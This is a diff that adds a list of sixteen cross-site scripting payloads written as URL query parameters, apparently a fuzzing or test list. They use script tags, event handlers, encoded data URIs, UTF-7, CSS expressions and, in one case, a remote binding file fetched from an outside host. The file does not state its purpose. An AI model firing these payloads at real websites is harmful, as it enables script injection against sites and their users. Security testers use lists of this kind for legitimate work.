@@ -1,0 +1,16 @@
+?xss0='\"'><script>alert(document.domain)</script>
+?xss1='\"/onfocus=alert(domain) autofocus a=\"'
+?xss2='\"'><marquee/onscroll=alert(domain)>XSS
+?xss3=<a/href=da&#x74&#97:text/html&#59&#x63harset=UTF-7&#44+ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAxACkAPAAvAHMAYwByAGkAcAB0AD4->test
+?xss4=]]><img src=xのerror=alert(1)>
+?xss5=＜script>alert(\"xss\")＜/script>
+?xss6=\></a style=\"xss:ex/**/pression(alert(domain));\"
+?xss7=''\"--><script>eval(String.fromCharCode(88,83,83)));%00
+?xss8=\"/onerror=alert(domain)//
+?xss9= style=\"-moz-binding:url(http://h4k.in/mozxss.xml#xss);\" a=\"
+?xssa=<form id=\"test\" /><button form=\"test\" formaction=\"javascript:alert(document.domain)\">X
+?xssb=\><video><source onerror=\"javascript:alert(document.domain)\">
+?xssc=''\"--><comment><img src=\"</comment><img src=x onerror=alert(1))//\">
+?xssd=<style><img src=\"</style><img src=x onerror=alert(domain)//\">
+?xsse=<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>
+?xssf=<img src=\"x` `<script>alert(1)</script>\"` `>
